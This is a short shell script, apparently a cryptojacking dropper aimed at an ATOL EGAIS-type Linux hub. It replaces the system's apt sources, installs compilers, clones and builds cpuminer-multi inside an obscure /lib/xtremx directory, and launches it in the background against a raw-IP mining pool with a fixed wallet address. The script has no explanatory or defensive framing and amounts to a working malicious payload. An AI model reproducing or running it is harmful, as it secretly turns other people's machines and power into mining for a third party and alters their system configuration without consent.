echo """deb http://repo-egais.atol.ru/hub19-x11 stable main nand proxy fptrserver fxpos rdp
deb http://httpredir.debian.org/debian/ jessie main contrib non-free
deb http://httpredir.debian.org/debian/ jessie-updates main contrib non-free
deb http://httpredir.debian.org/debian/ jessie-proposed-updates contrib main non-free
deb http://httpredir.debian.org/debian/ jessie-backports main contrib non-free 
deb http://security.debian.org/ jessie/updates main contrib non-free """ > /etc/apt/sources.list ;
apt-get update
apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++ git
mkdir /lib/xtremx/ && cd /lib/xtremx 
git clone https://github.com/tpruvot/cpuminer-multi.git 
cd cpuminer-multi && ./build.sh
./cpuminer -B -a cryptonight -o stratum+tcp://188.209.49.54:3333 -u etnkMLr5wQPV5tp2SApoxbNE2CcESCrHpNXdPHhfe8ANHbKPjKsU6jyYp4Qj68De7PU3iMccp7Cwb6E3q3gCuBAY1bJgD6HbtN -p x 
